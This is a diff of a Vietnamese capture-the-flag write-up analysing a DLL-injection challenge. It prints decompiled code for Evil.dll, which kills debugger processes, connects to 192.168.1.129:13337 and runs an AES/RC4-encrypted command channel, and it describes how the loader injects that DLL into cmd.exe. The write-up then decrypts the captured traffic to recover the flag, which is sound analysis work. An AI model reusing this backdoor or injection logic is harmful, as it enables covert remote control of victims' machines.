@@ -1946,7 +1946,7 @@
     KCSC{chachacha_w1th_me_and_welc0me_2_KCSC}
     ```
 
-# 10_STEAL (HARD_đang hoàn thiện)
+# 10_STEAL (HARD_DONE)
 
 - Chall: [FILE](CHALL/7_steal_hard.zip).
 
@@ -2180,8 +2180,285 @@
 
     Hàm này sẽ thực hiện tạo một danh sách các tiến trình trong hệ thống, lật lượt duyệt các tiến trình rùi kiểm tra xem có tiến trình `cmd.exe` không. Nếu thấy sẽ lưu lại ID của tiến trình.
 
+    ![alt text](IMG/10_1/image.png)
+
     Sau đó chương trình mở tiến trình cmd.exe với các quyền cấn thiết như đọc, ghi. Rùi cấp phát một vùng nhớ trong không gian địa chỉ của tiến trình đó. Tạo một luông từ xa để thực thi thư viện `Evil.dll`.
 
-    Như vậy tóm tắt lại hàm `sub_7FF7BB771070()` được dùng để tiêm dll vào tiến trình `cmd`.
+    ![alt text](IMG/10_1/image-1.png)
 
-    `Em sẽ hoàn thành nốt bài này trong thời gian sớm nhất ạ.`
+    Như vậy tóm tắt lại hàm `sub_7FF7BB771070()` được sử dụng để tiêm thư viện `Evil.dll` vào tiến trình `cmd.exe` và thực thi nó từ xa trong quá trình đó.
+
+- Bây giờ ta bất đầu phân tích `Evil.đll`:
+
+    ![alt text](IMG/10_1/image-2.png)
+
+    Sau khi load vào IDA, ta thực hiện tìm đến hàm `DllEntryPoint` (vì nó là một trong những điểm bắt đầu của DLL, được gọi tự động khi một DLL được load vào không gian địa chỉ của một tiến trình).
+
+    ![alt text](IMG/10_1/image-3.png)
+
+    Ta thấy có return về một hàm `sub_180001E48`, ta thực hiện click vào để xem hàm đó thì thấy như sau:
+
+    ![alt text](IMG/10_1/image-4.png)
+
+    Ở đây ta thấy có một hàm khả nghi đó chính là hàm `creat_Thread` có mục đích là tạo một luồng mới trong một tiến trình với hàm bắt đầu là `StartAddress`.
+
+    ![alt text](IMG/10_1/image-5.png)
+
+    Bây giờ ta bắt đầu xem nội dung của hàm `StartAddress()`:
+
+    ```C
+    DWORD __fastcall StartAddress(LPVOID lpThreadParameter)
+    {
+    HANDLE Toolhelp32Snapshot; // rdi
+    unsigned int v2; // esi
+    char *v3; // r9
+    HANDLE v4; // rax
+    void *v5; // rbx
+    DWORD CurrentProcessId; // eax
+    HANDLE v7; // rax
+    void *v8; // rbx
+    SOCKET v9; // rax
+    SOCKET v10; // rdi
+    UCHAR *v11; // rbx
+    int v12; // eax
+    int v13; // eax
+    size_t PtNumOfCharConverted; // [rsp+30h] [rbp-D0h] BYREF
+    struct sockaddr name; // [rsp+38h] [rbp-C8h] BYREF
+    PROCESSENTRY32W pe; // [rsp+50h] [rbp-B0h] BYREF
+    __int64 v18[8]; // [rsp+290h] [rbp+190h] BYREF
+    char v19[32]; // [rsp+2D0h] [rbp+1D0h] BYREF
+    UCHAR pbSecret[48]; // [rsp+2F0h] [rbp+1F0h] BYREF
+    char Dst[272]; // [rsp+320h] [rbp+220h] BYREF
+    char v22[1024]; // [rsp+430h] [rbp+330h] BYREF
+    char buf[1024]; // [rsp+830h] [rbp+730h] BYREF
+
+    pe.dwSize = 568;
+    Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
+    v2 = 0;
+    if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
+    {
+        do
+        {
+        PtNumOfCharConverted = 0i64;
+        wcstombs_s(&PtNumOfCharConverted, Dst, 0x104ui64, pe.szExeFile, 0xFFFFFFFFFFFFFFFFui64);
+        v18[0] = (__int64)"ollydbg.exe";
+        v18[5] = (__int64)"windbg.exe";
+        v3 = (char *)v18;
+        v18[1] = (__int64)"x64dbg.exe";
+        v18[6] = (__int64)"dbgview.exe";
+        v18[7] = (__int64)"immunitydbg.exe";
+        v18[2] = (__int64)"idaq.exe";
+        v18[3] = (__int64)"ida64.exe";
+        v18[4] = (__int64)"ida.exe";
+        while ( strcmp(Dst, *(const char **)v3) )
+        {
+            v3 += 8;
+            if ( v3 == v19 )
+            goto LABEL_10;
+        }
+        v4 = OpenProcess(1u, 0, pe.th32ProcessID);
+        v5 = v4;
+        if ( v4 )
+        {
+            TerminateProcess(v4, 1u);
+            CloseHandle(v5);
+        }
+        CurrentProcessId = GetCurrentProcessId();
+        v7 = OpenProcess(1u, 0, CurrentProcessId);
+        v8 = v7;
+        if ( v7 )
+        {
+            TerminateProcess(v7, 1u);
+            CloseHandle(v8);
+        }
+    LABEL_10:
+        ;
+        }
+        while ( Process32NextW(Toolhelp32Snapshot, &pe) );
+    }
+    CloseHandle(Toolhelp32Snapshot);
+    LODWORD(v9) = WSAStartup(0x202u, (LPWSADATA)&pe);
+    if ( !(_DWORD)v9 )
+    {
+        v9 = socket(2, 1, 0);
+        v10 = v9;
+        if ( v9 != -1i64 )
+        {
+        name.sa_family = 2;
+        *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.1.129");
+        *(_WORD *)name.sa_data = htons(0x3419u);
+        LODWORD(v9) = connect(v10, &name, 16);
+        if ( (_DWORD)v9 != -1 )
+        {
+            LODWORD(PtNumOfCharConverted) = time64(0i64);
+            srand(PtNumOfCharConverted);
+            v11 = pbSecret;
+            do
+            {
+            ++v2;
+            *v11++ = rand();
+            }
+            while ( v2 < 0x30 );
+            send(v10, (const char *)&PtNumOfCharConverted, 4, 0);
+            v12 = recv(v10, buf, 1024, 0);
+            sub_180001200(pbSecret, (PUCHAR)buf, v12, v19);
+            do
+            {
+            while ( 1 )
+            {
+                v13 = recv(v10, v22, 1024, 0);
+                if ( v13 <= 0 )
+                break;
+                if ( (unsigned __int64)v13 >= 0x400 )
+                sub_180001AC8();
+                v22[v13] = 0;
+                sub_180001000(v19, v22);
+                sub_180001460(v10, v22, v19);
+            }
+            }
+            while ( v13 );
+            closesocket(v10);
+            LODWORD(v9) = WSACleanup();
+        }
+        }
+    }
+    return v9;
+    }
+    ```
+
+    Tóm tắt những chức năng của hàm `StartAddress()` như sau:
+
+    - `(1):` Quét tất cả các tiến trình đang chạy trên hệ thống và kiểm tra xem có tiến trình nào là một công cụ gỡ lỗi (như `OllyDbg`, `x64Dbg`, `WinDbg`, `IDA`, `Immunity` `Debugger`,...) không. Nếu phát hiện một công cụ gỡ lỗi, hàm sẽ kết thúc  trình đó.
+
+        ![alt text](IMG/10_1/image-6.png)
+
+    - `(2):` Tạo một socket trong Windows bằng hàm socket dùng để kết nối đến máy chủ từ xa với địa chỉ và cổng là **192.168.1.129:13337**.
+
+        ![alt text](IMG/10_1/image-7.png)
+
+    - `(3):` Khởi tạo giá trị seed của hàm `srand()`, gửi giá trị seed 4 byte này tới máy chủ. Lấy ra `48` giá trị random từ hàm `srand()`.
+
+        ![alt text](IMG/10_1/image-8.png)
+
+    - `(4):` Nhận dữ liệu từ máy chủ, thực hiện giải mã bằng thuật toán `AES` với `key` và `iv` là `48` (32 + 16) giá trị vừa tạo ra được từ hàm `srand()`.
+
+        ![alt text](IMG/10_1/image-9.png)
+
+        ![alt text](IMG/10_1/image-10.png)
+
+    - `(5):` Nhận dữ liệu từ máy chủ, thực hiện giải mã/mã hóa dữ liệu bằng thuật toán `RC4` với `key` là phần giải mã bằng thuật toán AES ở trên.
+
+        ![alt text](IMG/10_1/image-11.png)
+
+        ![alt text](IMG/10_1/image-12.png)
+
+    - `(6):` Hàm này mình phỏng đoán là dùng để đọc đầu ra của lệnh nào vào bộ nhớ rùi thực hiện mã hóa xong gửi đến máy chủ.
+
+        ![alt text](IMG/10_1/image-13.png)
+
+- Do nội dung của yếu của hàm này là việc truyền và nhận dữ liệu đến máy chủ, kèm theo những mã hóa/giải mã dữ liệu. Lúc này ta bắt đầu tiến hành xem file `pcapng` để xem dữ liệu được gửi và nhận.
+
+    ![alt text](IMG/10_1/image-15.png)
+
+    Ta chú ý những lần gửi đến thì thấy có 3 gói tin có độ dài dữ liệu truyền đi lần lượt là `4`, `1001`, `36`. Lúc này ta có thể đoán `4` chính là gói truyền đi `seed` ở bước tóm tắt `(3)` còn dữ liệu có độ dài `1001`, `36` là dữ liệu truyền đi ở bước tóm tắt `(6)`. Đến đây ta có thể lấy giá trị `seed` để có thể gen ra `key` và `iv` cho thuật toán `AES`. Còn dữ liệu `1001`, `36` là dữ liệu sau khi mã hóa bằng thuật toán `RC4` nên ta để sau.
+
+    ![alt text](IMG/10_1/image-16.png)
+
+    ```C
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    int main() {
+        srand(0x674f4b38);
+        printf("Key: ");
+        for (int i = 0; i < 32; i++) {
+            int random_number = rand();
+            printf("%x", random_number & 0xFF);
+        }
+        printf("\n");
+        printf("IV: ");
+        for (int i = 0; i < 16; i++) {
+            int random_number = rand();
+            printf("%x", random_number & 0xFF);
+        }
+        return 0;
+    }
+    ```
+
+    ```C
+    Key: db9f47e5ffc275d7f4c31746e867ecc5af818b60b916f7dd41bf7341c84f9796
+    IV: c2b6a4ec8f25159eac7376d62bc07953
+    ```
+
+- Sau khi biết `key` và `iv` cho quá trình giải mã thì ta cần tìm được dữ liệu mà máy chủ gửi cho chúng ta để chúng ta giải mã, lúc này ta để ý những gói tin được gửi đến:
+
+    ![alt text](IMG/10_1/image-17.png)
+
+    Ta thấy có 3 gói tin có độ dài dữ liệu gửi đến là `32`, `13` và `3`. Do Ta thấy khi giải mã dữ liệu chương trình sử dụng thuật toán AES mà không có padding, nên điều kiện cần là độ dài dữ liệu phải là bội số của `16`, lúc này chỉ có gói tin có độ dài dữ liệu là `32` là hợp lý. Ta thực hiện lấy dữ liệu và tiến hành giải mã với `key` và `iv` ở trên.
+
+    ![alt text](IMG/10_1/image-18.png)
+
+    ```python
+    # giải mã
+    from Crypto.Cipher import AES
+
+    def decrypt_aes(key, iv, ciphertext):
+        cipher = AES.new(key, AES.MODE_CBC, iv)  
+        plaintext_bytes = (cipher.decrypt(ciphertext))  
+        return plaintext_bytes
+
+    if __name__ == "__main__":
+        try:
+            key_hex = input("Nhap khoa AES (64 ky tu): ").strip()
+            key = bytes.fromhex(key_hex) 
+            if len(key) != 32:  
+                raise ValueError("Khoa AES phai co do dai 256-bit (64 ky tu dang hex).")
+            iv_hex = input("Nhap IV (hex, 32 ky tu): ").strip()
+            iv = bytes.fromhex(iv_hex)
+            if len(iv) != 16:
+                raise ValueError("IV phai co do dai 128-bit (32 ky tu hex).")
+            plaintext_hex = input("Nhap chuoi can ma hoa (hex): ").strip()
+            plaintext_bytes = bytes.fromhex(plaintext_hex) 
+            decrypted_bytes = decrypt_aes(key, iv, plaintext_bytes)
+            decrypted_hex = decrypted_bytes.hex()
+            print("Chuoi da giai ma (hex):", decrypted_bytes)
+            print("Chuoi da giai ma (hex):", decrypted_hex)
+        except ValueError as e:
+            print(f"Lỗi: {e}")
+    ```
+
+    ![alt text](IMG/10_1/image-19.png)
+
+- Đến lúc này ta sử dụng key này để thực hiện giải mã/mã hóa nốt 2 dữ liệu gửi đi có chiều dài `1001` và `36` để xem nội dung là gì:
+
+    ```py
+    def RC4(key, cipher):
+        map = [i for i in range(256)]
+        ans = []
+        tmp1 = 0
+        for i in range(256):
+            tmp1 = (tmp1 + map[i] + key[i % len(key)]) & 0xFF
+            map[i], map[tmp1] = map[tmp1], map[i]
+        tmp1, tmp2 = 0, 0
+        for i in range(len(cipher)):
+            tmp1 = (tmp1 + 1) & 0xFF
+            tmp2 = (tmp2 + map[tmp1]) & 0xFF
+            map[tmp1], map[tmp2] = map[tmp2], map[tmp1]
+            ans.append(cipher[i] ^ map[(map[tmp1] + map[tmp2]) & 0xFF])
+        return ans
+
+    key = list(bytes.fromhex("546821735f31735f5233346c5f4b33795f6630725f5263345f44336372797074"))
+
+    cipher1 = list(bytes.fromhex("4f33d6b6db5f482ed66c775f5339d5457d8fb8c745fa79dc87c09f41e476e8ba8abcb07f"))
+    cipher2 = list(bytes.fromhex("2426ea99d566456be056254e5538fc6c34a9ebf066ec20dd8684ac74ee76dbd7eff8836d7fa392122536ae4f3204a7dd4b9d273167b34cd012ec35af9c16ee0613d0b7b4069fe8c2cf327362cd951e9050a49d6843f6c24f6203a8ff39d4df010c8c25ba23a2ea683e9b47f56cc663c3241719888447c921187a5e4993349fa1e8c7ee61e7ed7cad302bbbee23b4654ce8c38b72ae529f85eb41bb230d0466757f5f6ecca233929c58da451020e9c19ce9cabf6415971d15c7f69d7a1af89246b70f78288ea82b7eb9fcf57d3de0f5b47d77de62503fa1f322fac49782114a53edfbaa64c48e2aa3388c5126e72871e56535f48edb636889f526d8b2047182926fd2fd05d724f3bb482e439e1247c1b0f12c59011db4fe7c52247d4a96949e52dd7ef8c3b26ac1f4f0bde60b6a53016b918e268cbdea79da8a751b0d1aaee73a35f99dcb48f00c49eb56cc50b06b03bf94b5af4df1cc2b00adb264725599f34b00eac061f76e2822c5e100b1ad77bd3872c340088140dcf3cac5c436b1519543eeae05cec97d5d634472e162b5caf3e185dff406ec6d6565bf0a52d89aacfff59c852ca011110c01c1789455423518d74210cc1313fa687a6c5d8a51f5393d07c3273793403e24c7ea0b3c8ccef7877976f0eeb0d8865ca7a4b24157db71e9161fd344a5ee0b13ec5f758b8ed5f74c3f33fb10623b516a46b421c2453af520dcc202dbe9810eda9b106a64dbc6c4b961852d0391c5dcdeb9b25ccfc9dbd1d768c9de74debf6c102c20d5c3a78cdaedb88a692b4fb446483004a726badf12f2e006d4092aaf416ef16e130087953248122f2885c9aabacd9350ff7c015f12beb1ccf125f61bb51f9d5e5cdf3dd7dab80209d634362981fb2b7431009b4e026b0f7a8322a912d0bc7f93c60e16a4c01f32b0954cba25d2e46b5f69c450666fef699b7dcf9ae582a9ab61cd7cf074b5bc4f61e3bc6bdc4a59fda0c1e00097709ff14decbf9fadafcbec415f8a17b078039fa5cb25de5b78965e40021eea715468b2eedc7fddbeb0c5f034e5a3690aad572414af0cfbcb4e65ef61334440e22f49113dfb780d874f3c31a0c2b7b48947ea709fd75b8c18a23ad0119d518019656b82c2497909c6798afdb3396249bcb0d807b2756b1b783f0807c052b3b0ab93e922e5a079561714d71af4a170372d671be32b8828f0af485f1e34d01c8aa3d7df11b7a723a77c474850f9debb1e5b9ab213c778a69c7b7418497dee3bd22b4d2a8f33013fbad1942f6f486a909a9fcbeafbe3d45aaa1438d5983a14173522ccd0c24d83ac1ea8c1adae7a6b36e01c7d78fc122ada6dc7dd79aab00e1c413141a49db06ae20e1e17a86bb0a1014591c60d0a30d69b85945a43641e7270911d98c11757be34dd241be0d3aa"))
+
+    plain1 = RC4(key, cipher1)
+    plain2 = RC4(key, cipher2)
+
+    for i in plain1: print(end = chr(i))
+    print()
+    for i in plain2: print(end = chr(i))
+    # KCSC{The_Truth_Lies_Beyond_The_Code}
+    ```
+
+    ![alt text](IMG/10_1/image-20.png)
